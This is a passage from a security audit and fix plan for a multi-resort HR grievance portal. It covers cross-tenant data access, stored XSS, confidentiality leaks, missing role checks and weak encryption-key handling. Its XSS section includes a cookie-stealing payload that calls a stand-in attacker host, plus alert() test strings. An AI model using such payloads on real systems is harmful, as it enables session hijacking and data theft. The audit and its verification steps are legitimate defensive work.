| any other `flag` value (GM decision) | 711-755 | `GrivanceSubmissionModel::where("id",...)->first()` at **716** | **Committed.** Overwrites `Gm_Decision`, `Rejection_reason`, `Gm_Resoan`, `SentToGM` on the foreign grievance, and sends the foreign grievant a "GM decision" notification (725-732). |
| `flag=EditModeForCommittee` | 526-710 | `find()` at **532**, `where('id')->update` at **607 / 613 / 639**, investigation lookups at **533 / 664** | Blocked by accident today (see correction above). Scope it anyway. |

**Fix:**
1. At the very top of `InvestigationReportStore()`, before the `if/elseif/else`, load the grievance **once**, scoped:
   ```php
   $grievance = GrivanceSubmissionModel::where('id', $request->Grievant_form_id)
       ->where('resort_id', $this->resort->resort_id)
       ->first();
   if (!$grievance) {
       return response()->json(['success' => false, 'message' => 'Grievance not found.'], 404);
   }
   ```
   Then use `$grievance->id` (not the raw request value) in **every** later query in all three branches: lines 499, 500, 532, 533, 607, 611, 613, 623, 639, 664, 716.
2. In the `AssignToComittee` branch, reject committee IDs that don't belong to this resort:
   `GrievanceCommitteeMemberParent::where('id', $committee_ids)->where('resort_id', $this->resort->resort_id)->exists()` → otherwise 422. (`assign_to` is validated as an array but stored as `Committee_id`. Check which shape the form really sends before writing the check.)
3. In the `EditModeForCommittee` branch, return a clean 422 when `$gr_investigation` is null (line 664) instead of crashing on line 674.
4. Role checks for these branches are handled in **S2-06**. Don't mix them into this commit.

**VERIFY:** use the §0.5 harness with `METHOD = InvestigationReportStore`, run three times:
- `['flag' => 'AssignToComittee', 'Grievant_form_id' => $foreign->id, 'assign_to' => [<a committee id of resort A>]]` → expect `404` + `FOREIGN RECORD UNCHANGED`, and `GrivanceInvestigationModel::where('Grievance_s_id', $foreign->id)->where('resort_id', $userA->resort_id)->exists()` → `false`.
- `['flag' => 'GmDecision', 'Grievant_form_id' => $foreign->id, 'Gm_Decision' => 'X', 'Rejection_reason' => 'X', 'Gm_Resoan' => 'X']` → expect `404` + `FOREIGN RECORD UNCHANGED`.
- `['flag' => 'EditModeForCommittee', 'Grievant_form_id' => $foreign->id, 'outcome_type' => 'DeliverToHr']` → expect `404` + `FOREIGN RECORD UNCHANGED`.
- Same-resort control: repeat the `AssignToComittee` call with a grievance and committee from resort A → must succeed (`success: true`).
```bash
grep -nE "Grievant_form_id\)" app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrivanceController.php | grep -vE "^\s*[0-9]+:\s*//"
```
Expected: the only remaining hit is the single scoped lookup added in step 1.

---

### S2-02 · HIGH · "Request witness statement" works across resorts

**Where:** `GrivanceController::RequestForStatement()` — `GrivanceController.php:886-925`.
`GrivanceSubmissionModel::where('Grivance_id',$id)->first()` at **889**, no `resort_id`. It looks up by the human number (`GR-0042`), which is a **global** sequence (S2-10), so any number maps to exactly one grievance in some resort.

**Confirmed effect:** a portal user in resort A who sends `id=GR-0042` flags resort B's grievance `RequestforStatment=Yes` (890-891), sets all of B's witnesses to `status=Requested` (892), and **sends B's witnesses in-app and mobile push notifications** naming the case number (894-919). Also: an unknown number crashes on line 890 (null), giving a 500.

**Fix:** add `->where('resort_id', $this->resort->resort_id)` to line 889 and return 404 when it's null. Role check → S2-06.

**VERIFY:** §0.5 harness, `METHOD = RequestForStatement`, request `['id' => $foreign->Grivance_id]` → expect `404` + `FOREIGN RECORD UNCHANGED`, and
`\App\Models\GrivanceSubmissionWitness::where('G_S_Parent_id', $foreign->id)->where('status','Requested')->count()` is the same before and after. Same-resort control must still succeed. Also `['id' => 'GR-99999']` → `404`, not `500`.

---

### S2-03 · HIGH · Grievance settings: cross-resort deletes and edits

**Where:** `ConfigurationController.php` (grievance settings methods). This controller has **zero** permission checks (see S2-06), and these methods have **no `resort_id` filter**:

| Method | Line | Unscoped query | Effect on another resort |
|---|---|---|---|
| `GrievanceCategoryDestory` | 2127 | `GrievanceCategory::where("id",$id)->delete()` | **Deletes** its grievance category |
| `GrievanceSubCategoryDestory` | 2297 | `GrievanceSubcategory::where("id",$id)->delete()` | **Deletes** its sub-category |
| `GrievanceCatAndSubCategoryDestory` | 2559 | `GrievanceCategoryAndSubcatModel::where("id",$id)->delete()` | **Deletes** its priority mapping |
| `GrievanceDelegeationRuleDestory` | 2771 | `GrievanceDelegationRuleModel::where("id",$id)->delete()` | **Deletes** its delegation rule |
| `GrivanceTempleteDestory` | 3058 | `GrievanceTempleteModel::where("id",$id)->delete()` | **Deletes** its template |
| `GrievanceEscalationDestory` | 3292 | `GrivanceEscaltionModel::where("id",$id)->delete()` | **Deletes** its escalation rule |
| `GrievanceDelegeationRuleinlineUpdate` | 2700 (update at ~2747) | `GrievanceDelegationRuleModel::where("id",$Main_id)->update(...)` | **Edits** its delegation rule |
| `GrievanceEscalationinlineUpdate` | 3224 (update at ~3269) | `GrivanceEscaltionModel::where('id', $mainId)->update(...)` | **Edits** its escalation rule |
| `GrievanceTempleteEdit` | 3042 | `GrievanceTempleteModel::find($id)` | **Reads** its template (and 500s on an unknown id) |
| `GrievanceCategoryWiseSubCategoryData` | 2321 | `GrievanceSubcategory::where("Grievance_Cat_id",...)` | **Reads** its sub-category list |

The IDs are `base64` of sequential integers, so this is trivially scriptable: loop over IDs and wipe every resort's grievance setup. The sibling `GrivevanceCommitteesDestory` (line 3538) and the category/sub-category inline updates (2074, 2240, 2486) are already scoped correctly. **Copy their pattern.**

**Fix:** for each row, add `->where('resort_id', $this->resort->resort_id)` to the query, and for the deletes/edits return `404` when nothing matched (check `->exists()` first, or check the affected-row count). Don't change anything else in these methods.

**Also check when fixing (same pattern, lower impact):** the grievance **store** paths accept `Grivance_Cat_id` / `Grivance_Sub_cat` / `Grievance_Cat_id` without checking they belong to this resort (`GrivanceController.php:341-342`, `API/GrievanceController.php:196-197`, `ConfigurationController.php:2491-2492` uses a bare `exists:grievance_categories,id`). Use `Rule::exists(...)->where('resort_id', …)` the way `GrievanceAppealController.php:204-207` already does.

**VERIFY:** for **each** of the 10 methods, run the §0.5 harness with a foreign record of that model (`GrievanceCategory`, `GrievanceSubcategory`, `GrievanceCategoryAndSubcatModel`, `GrievanceDelegationRuleModel`, `GrievanceTempleteModel`, `GrivanceEscaltionModel`) and the id passed exactly as the route expects (`base64_encode($foreign->id)` for the `{id}` routes). Expect `404` + the foreign row still exists and is unchanged. Paste a 10-row result table. Same-resort control: delete one of resort A's own categories → must succeed.
```bash
f=app/Http/Controllers/Resorts/GrievanceAndDisciplinery/ConfigurationController.php
for m in GrievanceCategoryDestory GrievanceSubCategoryDestory GrievanceCatAndSubCategoryDestory GrievanceDelegeationRuleDestory GrivanceTempleteDestory GrievanceEscalationDestory GrievanceDelegeationRuleinlineUpdate GrievanceEscalationinlineUpdate GrievanceTempleteEdit GrievanceCategoryWiseSubCategoryData; do
  s=$(grep -n "function $m(" $f | cut -d: -f1); e=$(awk -v s=$s 'NR>s && /public function/ {print NR; exit}' $f)
  echo "$m resort_id-mentions=$(sed -n "${s},${e}p" $f | grep -c resort_id)"; done
```
Expected: every method shows `resort_id-mentions` ≥ 1.

---

### S2-04 · HIGH · Stored XSS — grievance text runs as code in HR's browser  ·  *Frontend fix (Blade) + one controller line*

**What it is:** any employee can type HTML/JavaScript into a grievance from the **mobile app** (no sanitising in `API/GrievanceController.php:205-208`) or the web form. When HR or a committee member opens the case, the portal renders that text **unescaped**, so the script runs **as HR, inside HR's logged-in session**. It could read every resort record HR can see or act as HR. Example payload in the description field: `<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`.

**Where it's rendered raw:**

| File:line | Field | Who writes it |
|---|---|---|
| `resources/views/resorts/GrievanceAndDisciplinery/grivance/investigationreport.blade.php:124` | `Grivance_description` | **Any employee** (mobile/web) — plain text |
| `resources/views/resorts/GrievanceAndDisciplinery/grivance/Investigationinfo.blade.php:91` | `Grivance_description` | **Any employee** — plain text |
| `investigationreport.blade.php:276` | `Gm_Resoan` | whoever submits the GM decision (S2-06: any portal user) — plain text |
| `investigationreport.blade.php:215`, `Investigationinfo.blade.php:186` | `follow_up_description` | committee (see S2-06) |
| `investigationreport.blade.php:223, 226`, `Investigationinfo.blade.php:194, 197` | `inves_find_recommendations` | committee — **CKEditor rich text** (intended HTML) |
| `GrivanceController.php:1024-1026, 1035` (History & Logs DataTable) | `Grivance_Eexplination_description` returned as the `Note` column and listed in `rawColumns` | **Any employee** — plain text |

**Fix:**
1. **Plain-text fields** (`Grivance_description`, `Gm_Resoan`, `follow_up_description`): change `{!! $x !!}` to `{!! nl2br(e($x)) !!}`. This escapes the HTML and keeps line breaks. (Check `follow_up_description`'s form input first: if it's a CKEditor field, treat it like step 2 instead.)
2. **Rich-text field** (`inves_find_recommendations`): it needs *some* HTML, so it must be **sanitised**, not escaped. Add `mews/purifier` (HTMLPurifier) and render with `{!! clean($value->inves_find_recommendations) !!}`. Don't write a home-made regex sanitiser.
3. **History & Logs DataTable** (`GrivanceController.php:1035`): remove `'Note'` from `rawColumns` (DataTables then escapes it). The `Employee_Name` column (998-1006) builds HTML from names. Wrap the name parts in `e()` while you're on that line.
4. **Same-page siblings (invariant #7):** grep every grievance/appeal Blade view and every grievance `rawColumns` list for other raw user text. Only the lines above were found in the audit, but confirm.

**VERIFY:**
```bash
grep -rnE "\{!!\s*\\\$(Grivance_Parent->(Grivance_description|Gm_Resoan)|value->follow_up_description)\s*!!\}" resources/views/resorts/GrievanceAndDisciplinery/
```
Expected: *(no output)*
```bash
grep -rn "inves_find_recommendations" resources/views/resorts/GrievanceAndDisciplinery/grivance/*.blade.php | grep "{!!" | grep -v "clean("
```
Expected: *(no output)*
```bash
sed -n '/function HistoryAndLogs/,/function GrivnanceDestory/p' app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrivanceController.php | grep rawColumns
```
Expected: the list no longer contains `'Note'`.

**`HUMAN` browser test on staging (required):** submit a grievance from the mobile app with description `<img src=x onerror=alert('XSS-desc')>` and explanation `<img src=x onerror=alert('XSS-note')>`. As HR, open (a) the Investigation Report page, (b) the View Report page, (c) History & Logs after resolving it. **No alert box may appear**; the text must show literally as `<img src=x …>`. Also enter `<b>bold</b><script>alert(1)</script>` in a committee recommendation (CKEditor): the bold stays, the script is gone, no alert.

---

### S2-05 · HIGH · Confidential grievant's identity leaks

**What it is:** employees can file a grievance as **Confidential** (`Grivance_Submission_Type = "Yes"`). The main list and investigation pages correctly hide the name unless the grievant approved disclosure (`GrivanceController.php:458`, `:829`; list at `:190-207`). Three other paths ignore that flag:

| # | Where | What leaks | Status |
|---|---|---|---|
| a | **History & Logs** — `GrivanceController::HistoryAndLogs()`, `:949-1006` | Grievant's **name, photo, department, section, position** for every resolved grievance, confidential or not. There's no `Grivance_Submission_Type` check anywhere in the method. The route (`GrievanceAndDisciplinery.Disciplinary.HistoryAndLogs`) isn't in `module_pages`, so any portal user can open it. | CONFIRMED |
| b | **Mobile push to HR** — `API/GrievanceController.php:258` | Notification text is `'A grievance submission has been sent by ' . first_name . ' ' . last_name`, sent even when `Confidential = option1`. The web submission path (`GrivanceController.php:384`) correctly omits the name. | CONFIRMED |
| c | **Attachment storage** — `API/GrievanceController.php:227` | Mobile attachments are stored with `Common::AWSEmployeeFileUpload($resort_id, $file, <grievant's Emp_id>, "GrivanceAttachments", true)`. That helper (`app/Helpers/Common.php:8968+`) files them in a `GrivanceAttachments` sub-folder **inside the grievant's own personal employee folder** in File Management. Anyone who can browse employee folders sees which employee has grievance attachments. | LIKELY — confirm who can browse another employee's folder in File Management |

**Fix:**
- **a:** In `HistoryAndLogs()`, apply the same rule the main list uses: for rows where `Grivance_Submission_Type == 'Yes'` and the viewer's employee id isn't in `Identity_Disclosed_To`, return `Confidential` for the name, and a blank avatar, department, section and position. Reuse the logic from `GrivanceIndex` (`:190-207`). Don't write a second version of the rule.
- **b:** Build the message the way the web path does: no name when the submission is confidential (keep the name for non-confidential if HR wants it).
- **c:** Store grievance attachments in a resort-level grievance folder (not tied to the employee), the same way the web path does: `StorageHelper::put(config('settings.GrivanceAttachments').'/'.$resort_id.'/'.$Grivance_id.'/…')` at `GrivanceController.php:355-363`. Existing files already in employee folders need a one-off move (migration or command), which Ankit decides on. **Coordinate with S2-07**: these files are "secure" (encrypted) uploads.

**VERIFY:**
- a: in tinker, run `HistoryAndLogs` as an HR user with a resolved **confidential** grievance in the data (create one inside a transaction if none exists), decode the JSON, and confirm that row's `Employee_Name` contains `Confidential` and not the real name. Paste the row. A non-confidential row must still show the name.
- b: `grep -n "grievance submission has been sent by" app/Http/Controllers/API/GrievanceController.php`, then show the surrounding code: the name must only be added inside a non-confidential branch.
- c: `HUMAN` answers: "Can a non-HR portal user browse another employee's personal folder in File Management? yes/no". Then after the fix, submit a confidential grievance with an attachment from the mobile app and confirm **no** new file appears in the grievant's personal folder.

---

### S2-06 · HIGH · No role checks — any portal user can run committee / GM / HR actions

**What it is:** because of X-01, the portal's middleware lets every grievance route through except the 4 listed ones. Checks inside the methods are missing or also point at unlisted routes. So **any employee with a portal login in the resort** (a line supervisor, or the manager the grievance is *about*) can:

| Action | Method | Inside-method check today |
|---|---|---|
| Open **any** grievance's full investigation report / view report (description, attachments, witnesses, committee notes; name too if not confidential) | `InvestigationReport` `:398`, `Investigationinfo` `:757` | none |
| Assign a committee; record the **GM decision**; mark resolved | `InvestigationReportStore` `:471` | only the committee-member check on the edit branch |
| Request witness statements | `RequestForStatement` `:886` | none |
| **Delete** a grievance | `GrivnanceDestory` `:1044` | none (the delete-permission check at `:137` only hides the button in the list) |
| Change **key personnel** (the people allowed to ask for a confidential grievant's identity) | `ConfigurationController::KeyPersonnel` `:1720` | none |
| Create / edit / delete **grievance committees** (e.g. add themselves to one) | `GrievanceCommitteeStore` `:3314`, `GrivanceCommitteeinlineUpdate` `:3444` | none |
| All other grievance settings (categories, templates, rules) | `ConfigurationController` | none — the controller has **0** permission checks |
| **Decide an appeal**, including the person who filed it, deciding their own | `GrievanceAppealController::decide` `:273` (also `storeHearing`, `updateHearingStatus`) | `loadAppealForWrite` checks `edit` permission on `Appeals.Index`, **which isn't listed, so it always passes** |
| File an appeal against **any** grievance in the resort, not just their own | `GrievanceAppealController::store` `:115` | none |

The realistic abuse is inside one resort: the accused manager reads the complaint and witness list against them, adds themselves to the committee, or deletes the case. For an international client, this is the sort of finding that fails an HR-system audit.

**Fix (grievance-local; don't wait for X-01):**
1. Add one private helper **per controller** (or a shared one in `Common.php` if Ankit prefers) that answers "is this user HR-equivalent?" using the rule `GrievanceAppealController::isHrEquivalent()` (`:344-354`) already implements: rank 3 / HR, rank 8 / GM, HR-department rank 1-2, master admin. **Reuse it. Don't invent a new rule.**
2. Gate each action:
   - **HR-equivalent only:** all `ConfigurationController` grievance methods, `KeyPersonnel`, `GrivnanceDestory`, `RequestForStatement`, the `AssignToComittee` branch, appeal `decide` / `storeHearing` / `updateHearingStatus`.
   - **GM (rank 8) or HR-equivalent only:** the GM-decision branch of `InvestigationReportStore` (confirm with Ankit whether HR may record a GM decision on the GM's behalf).
   - **HR-equivalent OR a member of the grievance's assigned committee:** `InvestigationReport`, `Investigationinfo`, the `EditModeForCommittee` branch (it already checks membership. Keep that and add the HR-equivalent bypass only if HR should also be able to edit).
   - **Appeal `store`:** the grievant (`created_by` / `Employee_id` of the grievance) or HR-equivalent.
   - **Appeal `decide`:** additionally refuse when `$appeal->submitted_by` is the current user's employee id.
3. Return `403` JSON for AJAX routes and `abort(403)` for page routes, matching each method's existing style.

**VERIFY:** for each row in the table, pick a portal user of the **same** resort who is **not** HR, GM or a committee member (rank 1-2 outside HR, or any rank-4+ portal user). Call the method with the §0.5 harness pattern (same resort this time) → expect `403`, and the record unchanged. Then repeat as an HR user → expect success. Paste a table: `Action | non-HR result | HR result`. Also: the appeal's own submitter calling `decide` on their own appeal → `403`.

---

### S2-07 · HIGH · "Secure" file encryption key read with `env()` — likely empty in production (affects all modules)

**Where:** `env('ENCRYPTION_KEY')` is called directly **17 times** in:
`app/Helpers/Common.php` (e.g. inside `AWSEmployeeFileUpload`, `:8968+`), `app/Helpers/EmployeeDocumentFiler.php`, `app/Http/Controllers/Resorts/FileManagment/FileManageController.php`, `app/Http/Controllers/Resorts/Visa/XpactEmployeeController.php`, `app/Http/Controllers/Resorts/People/Transfer/TransferController.php`.
The key is derived as `hash('sha256', env('ENCRYPTION_KEY'), true)` and used for AES-256 on every "secure" upload: grievance attachments, visa/passport documents, employee documents.

**Why it matters:**
- `ENCRYPTION_KEY` is **not defined in any `config/*.php` file**, and **not present in `.env.example` or `.env.staging`**.
- In Laravel, once `php artisan config:cache` has run (standard in production), `env()` **returns `null` everywhere outside config files**.
- In either case (never set, or config cached), the key becomes `sha256("")`, a **publicly known constant**. The "encrypted" passports and grievance files are then encrypted with a key anyone can calculate, so the encryption protects nothing if the Wasabi bucket or its credentials ever leak.
- **Evidence that production caches config** (found in Stage 3): the comment in `resources/views/partials/pusher-init.blade.php` says that on the live server `env()` calls outside `config/*.php` return null because `config:cache` runs on "any standard deploy", which is why that file was switched to `config()`. So on production, `env('ENCRYPTION_KEY')` is **almost certainly null today**. The `HUMAN` check in step 1 below is still needed to confirm it.

**Fix — `HUMAN` first (decides the path):**
1. On the production box: is `ENCRYPTION_KEY` set in `.env` (report length only: `grep -c '^ENCRYPTION_KEY=.\+' .env`)? Is config cached (`ls bootstrap/cache/config.php`)?
2. **If files have been encrypted with `sha256("")`** (key unset, or config cached): **changing the key breaks decryption of every existing secure file.** The fix must include a fallback: try the real key, and if decryption fails, try the legacy empty-string key. Then run a one-off re-encryption command. Ankit plans this; don't do it blindly.

**Fix — code:**
1. Add `'encryption_key' => env('ENCRYPTION_KEY'),` to `config/app.php` (or a dedicated config file), and replace all 17 `env('ENCRYPTION_KEY')` calls with `config('app.encryption_key')`.
2. Fail loudly: if the configured key is empty, throw instead of silently encrypting with an empty key.
3. Add `ENCRYPTION_KEY=` (empty placeholder) to `.env.example`.
4. **Other `env()` calls outside `config/`:** there are 52 in `app/`, `routes/`, `resources/views/`. They have the same "null in production" problem. List them in §9. Don't fix them in this issue.

**VERIFY:**
```bash
grep -rn "env('ENCRYPTION_KEY')" app routes resources
```
Expected: *(no output)*
```bash
php artisan config:cache && php artisan tinker --execute="echo strlen((string) config('app.encryption_key')) > 0 ? 'KEY LOADED WITH CONFIG CACHED' : 'KEY EMPTY';" ; php artisan config:clear
```
Expected: `KEY LOADED WITH CONFIG CACHED` (on a box whose `.env` has the key).
- Round trip: upload a secure file (e.g. a grievance attachment from the mobile app on staging), then open or download it in the portal. It must display correctly. **If S2-07 includes the legacy fallback**, also open a secure file uploaded **before** the change and confirm it still opens.

---

### S2-08 · MEDIUM · Investigation files overwrite each other; web uploads accept any file type

**Where:**
- `GrivanceController.php:656-661` stores committee investigation files at `config('settings.GrievanceSubmission').'/'.<resort_id>.'/'.<original file name>`, **one folder for the whole resort**. Two grievances that each upload `report.pdf` → the second overwrites the first. Both cases then point at the same file, and **grievance A's page serves grievance B's evidence**. `API/GrievanceController.php:411-433` (`resolvePlainFileUrls`) reads from the same shared folder.
- No file-type or size validation on the web uploads: `GrievanceSubmiteStore` (`:357-365`, `Attachments`) and `InvestigationReportStore` (`:648-662`, `investigation_file`). Any file type, including `.html` / `.svg` / `.php`, is accepted. The mobile witness path already validates (`API/GrievanceController.php:793`). Copy that list.

**Fix:**
1. Store investigation files under a per-grievance path and with a unique name, the way the mobile witness path does (`time() . '_' . name`, `API/GrievanceController.php:815`): e.g. `.../<resort_id>/<Grivance_id>/investigation/<unique>_<name>`. Update the readers (`resolvePlainFileUrls`, and the investigation views' file links) to match. Existing rows need the old path as a fallback.
2. Add `'Attachments.*' => 'file|max:<limit>|mimes:jpeg,png,jpg,heic,heif,mp4,mov,doc,docx,pdf,mp3,m4a,wav,aac,ogg'` and the same for `investigation_file.*`.

**VERIFY:** on staging, upload `report.pdf` (content A) to grievance 1's investigation, then a different `report.pdf` (content B) to grievance 2. Download from grievance 1 → still content A. Try uploading `test.html` to both web forms → rejected with a 422 validation error. Paste the storage paths of both files.

---

### S2-09 · MEDIUM · Grievant's app shows witness statements and internal committee notes  ·  ✅ DECIDED

**Where:** `API/GrievanceController::grievanceDetail()` — `API/GrievanceController.php:510-642`. It's correctly scoped (only the grievant's own grievance), but it returns to the **grievant**:
- every witness's **name, photo, written statement and attachments** (`:529-547`)
- the committee's internal timeline: **recommendations, follow-up actions, resolution notes, and which committee member wrote each** (`:555-581`)

**Why it's flagged:** in most HR grievance procedures, witness statements and internal committee deliberations are **not** shown to the complainant, because it exposes witnesses to pressure or retaliation. This may be a deliberate product choice, which is why it's a decision item, not a bug.

**✅ DECIDED by the product owner (2026-09-26):**
- **Witness statements: NOT shown to the grievant.** In each `witnesses[]` entry of the `grievanceDetail` response, **remove `statement` and `attachments`** (`API/GrievanceController.php:543-545`). Keep `employee_id`, `name`, `photo` (the grievant chose these witnesses when filing, so hiding names protects nothing), and `status`, so the grievant can see whether a statement has been given, but not what it says.
- **Committee internal notes: STILL shown to the grievant, for now.** Leave the `investigation` block (`:555-581`: recommendations, follow-up actions, resolution notes, committee member names) as it is. This is a deliberate, temporary product choice. Revisit it before the international client's HR team goes live, and record any change here.

**Fix:** delete the two keys from the witness map in `grievanceDetail()`. Don't touch `witnessStatementRequest()` (`:721+`): that's the **witness** viewing their **own** statement, which is correct. **Invariant #7:** check that no other mobile or web endpoint returns `GrivanceSubmissionWitness.Statement` / `.Attachement` to the grievant (`grep -rn "Statement\|Attachement" app/Http/Controllers/API/GrievanceController.php`). `myGrievances()` returns only `witness_count`, which is fine. The mobile app must cope with the missing keys, so tell the app developer before deploying.

**VERIFY:** call `grievanceDetail` (as the grievant, via the mobile API or tinker) for a grievance where at least one witness has **submitted** a statement with an attachment, and paste the JSON of `data.witnesses[0]` and the key list of `data.investigation`. Expected: `witnesses[0]` has `employee_id`, `name`, `photo`, `status` and **no** `statement` / `attachments`; `investigation` still contains `timeline` with the committee entries. Then call `witnessStatementRequest` **as that witness**: they still see their own `existing_statement`.

---

### S2-10 · LOW · Grievance numbers are one global sequence across all resorts

**Where:** `Common::getGriveanceID()` (`app/Helpers/Common.php:7877`) takes the **latest grievance in the whole table**, across every resort, and adds 1 (`GR-0001`, `GR-0002`, …).

**Why it matters:** (1) a user in one resort can estimate **how many grievances exist system-wide** from the gaps between their own numbers, which is business information another client shouldn't see; (2) it's what made S2-02 exploitable by number; (3) two grievances submitted at the same moment can get the **same** number (read-then-write race).

**Fix:** generate the number per resort (filter by `resort_id`), and protect it with a unique index on `(resort_id, Grivance_id)` via a **migration**. Existing numbers stay as they are. `HUMAN`: confirm nothing outside the app (reports, printed letters) depends on numbers being globally unique.

**VERIFY:** in tinker, inside a transaction, create a grievance in resort A and one in resort B. The numbers are generated independently (B's doesn't follow A's). `SHOW INDEX FROM grivance_submission_models` lists the new unique index.

---

### S2-11 · LOW · Mobile witness-statement lookup not scoped (safe today)

**Where:** `API/GrievanceController.php:826` — `GrivanceSubmissionModel::find($request->grievance_id)`.

**Correction to an earlier chat claim:** this was reported as a minor cross-resort read. On closer tracing it's **not exploitable today**: it only runs after `:803-809` has proved the caller is a registered witness on that grievance, and witnesses can only be added from the caller's own resort. It's still worth scoping in case that earlier check is ever changed. The `exists:grivance_submission_models,id` rule at `:791` has the same gap.

**Fix:** add `->where('resort_id', $this->resort_id)` to line 826, and change the `:791` rule to `Rule::exists('grivance_submission_models','id')->where('resort_id', $this->resort_id)`.

**VERIFY:**
```bash
sed -n 785,830p app/Http/Controllers/API/GrievanceController.php | grep -nE "find\(|exists:"
```
Expected: *(no output)* — both replaced by scoped versions.

---

### X-01 · HIGH · Portal permission check allows every unlisted route  ·  ✅ DECIDED: extend the existing Permission module

#### How the Permission module works today (plain-language explanation)

1. **Where HR sets it:** HR → Permissions (`app/Http/Controllers/Resorts/ResortInternalPermission.php`). HR picks a **department + position**, and for each **page** ticks **View / Create / Edit / Delete**. Saved in `resort_interal_pages_permissions` (per resort, department, position, page, permission type).
2. **What a "page" is:** one row in `module_pages` = **one route name** (`internal_route`). Payroll, for example, has 7 tickable pages: Dashboard (`payroll.dashboard`), Shopkeepers (`shopkeepers.create`), **Run Pay Roll (`payroll.run`)**, Pension, EWT, Final Settlement, Configuration (`database/seeders/ResortModulePagesSeeder.php:454-505`).
3. **What's checked on every portal request:** `app/Http/Middleware/CheckResortPermission.php` → `Common::checkRouteWisePermission()` looks up the **exact** route name being called in `module_pages`:
   - **Listed page** → checks the user's position has the **View** tick (`Common::resortHasPermission`). ✅ This works. It's why an HOD without the tick doesn't see the menu or the page.
   - **Not a listed page** → `if(!$pagesList){ return true; // No page found for this route }` → **allowed for every logged-in portal user.**
4. **The gap:** a screen like *Run Pay Roll* is one route (`payroll.run`), but it works by calling **many other routes in the background**: `payroll.getData`, `payroll.saveReviews`, `payroll.saveSummary`, `payroll.download`, `payroll.export.review`, `payroll.send.approval`… **None are listed pages, so all are allowed for anyone logged in.** Unticking "Run Pay Roll" hides the page and menu (the door), but the data and actions behind it (the windows) stay open. Anyone who calls those addresses directly, or changes an ID in one, gets through.
5. **Two more weaknesses:**
   - The middleware always checks **View**, even for saving and deleting. HR's **Create / Edit / Delete** ticks aren't enforced by it at all.
   - Matching is by **exact** route name only, with no "this route belongs to that page" concept.
6. **Who this affects:** everyone who can log into the portal. The login blocks only **Supervisors (rank 5) and Line Workers (rank 6)** (`ResortLoginController.php`, "Web-portal access gate"). Every HOD, EXCOM, Manager, Finance, GM, MD, Security Officer, Engineering HOD and Clinic user can log in.

**Scale:** in the repo's seed files, about **140 of 1,544** portal route names are listed pages (~9%). The super-admin can add pages in the admin panel, so the **live** number may be higher. `HUMAN` runs this **read-only** command on production to get the exact picture (it changes nothing):
```php
php artisan tinker --execute='
$listed = \App\Models\ModulePages::whereNull("deleted_at")->pluck("internal_route")->filter()->unique();
$portal = collect(\Illuminate\Support\Facades\Route::getRoutes())->filter(fn($r) => in_array("checkResortPermission", $r->gatherMiddleware()))->map(fn($r) => $r->getName())->filter()->unique();
echo "portal routes: ".$portal->count().PHP_EOL."listed as permission pages: ".$portal->intersect($listed)->count().PHP_EOL."NOT covered by the Permission module: ".$portal->diff($listed)->count().PHP_EOL;
file_put_contents(storage_path("app/unprotected_routes.txt"), $portal->diff($listed)->sort()->implode(PHP_EOL));
echo "full list written to storage/app/unprotected_routes.txt".PHP_EOL;'
```

#### ✅ DECIDED fix plan (product owner, 2026-09-26): extend the Permission module HR already uses

Goal: **HR's ticks become the single control for every portal address**, not just for the page that opens a screen. HR keeps using the same Permissions screen; nothing changes for them.

**Step 1 — Give every route an owner page and a required tick.**
Create `config/route_permissions.php`: a map from **every** portal route name to the page it belongs to and the tick it needs:
```php
return [
    // route name                => [owner page (module_pages.internal_route), required permission]
    'payroll.getData'            => ['payroll.run', 'view'],
    'payroll.download'           => ['payroll.run', 'view'],
    'payroll.export.review'      => ['payroll.run', 'view'],
    'payroll.saveReviews'        => ['payroll.run', 'edit'],
    'payroll.saveSummary'        => ['payroll.run', 'edit'],
    'payroll.send.approval'      => ['payroll.run', 'edit'],
    'deductions.delete'          => ['payroll.configration', 'delete'],
    // …one line per route…
    // Routes every logged-in portal user genuinely needs (own profile, notifications, global search,
    // dashboards' widget endpoints, chat) are listed explicitly:
    'resort.getMenuData'         => ['*', 'any_authenticated'],
];
```
Rule of thumb for the tick: `GET` that reads data → `view`; creating → `create`; changing → `edit`; removing → `delete`. Build the first version by module, starting with the most sensitive: **Payroll → Manning & Budget → Talent Acquisition → Grievance & Disciplinary → Visa & Documents → People**. Use `storage/app/unprotected_routes.txt` from the command above as the checklist.

**Step 2 — Make the middleware enforce the map, in "report-only" mode first.**
Change `Common::checkRouteWisePermission()` / `CheckResortPermission` so that for the current route it:
1. uses the route's own `module_pages` row if it has one (today's behaviour), otherwise the owner page from `config/route_permissions.php`;
2. checks the **required tick** from the map (not always View);
3. `any_authenticated` → allow;
4. **route in neither place** → during report-only: **allow but log** (`Log::warning('UNMAPPED_ROUTE', [route, user, resort])`); after switch-over: **deny (403)**.

Run report-only in production for **about 1-2 weeks**, fix every `UNMAPPED_ROUTE` in the log (add it to the map), then flip the switch (`config('route_permissions.enforce_unmapped') = true`). This avoids the outage risk of a sudden "deny everything".

**Step 3 — Keep the record-level rules in code.**
HR's ticks are per **position**, so they can't express "only **their own department's** applicants/budget", "only the applicants **assigned** to this interviewer", or "the GM only sees the item **waiting for the GM's approval**". Those stay as the in-method checks already specified per module (S2-06, P-01, W-03, W-04, T-05 and later modules). The two layers work together: the **tick** decides whether the user may use the feature at all, and the **code** decides which records they may touch.

**Step 4 — Seed sensible default ticks** so a fresh resort isn't wide open or locked out: via a **migration**, not the seeder alone (see CLAUDE.md on `module_pages`). HR, Finance and GM ticks follow the decisions already recorded in this file (P-01, W-02/W-03, T-05, S4-02).

**What this does NOT replace:** the per-module tenant checks (`resort_id`) and the per-module role decisions above. It's the outer lock. Those are the inner ones.

**VERIFY:**
- After Step 1: re-run the read-only command. **`NOT covered by the Permission module` must be 0** (every portal route is either a listed page or in the map).
- During Step 2 report-only: `grep -c UNMAPPED_ROUTE storage/logs/laravel*.log` trends to **0** over the report period. Paste the counts per day.
- After switch-over, for each module fixed so far, as an HOD whose position has **no** tick on that module: call 3 background routes directly (e.g. `payroll.getData`, `payroll.saveReviews`, `payroll.download`) → all `403`. Tick **View only** for that position → the read routes work, `saveReviews` still `403`. Tick **Edit** → `saveReviews` works. Paste the table.
- Regression: an HR user and a GM user click through every menu of every module on staging with no unexpected `403`.

---

### Stage 2 — checked and found clean

So Claude Code doesn't spend time re-auditing these:
- Grievance **delete** (`GrivnanceDestory`) and **RequestIdentity** are correctly scoped to the resort (`GrivanceController.php:1050`, `:843`). *Role* checks are still missing (S2-06).
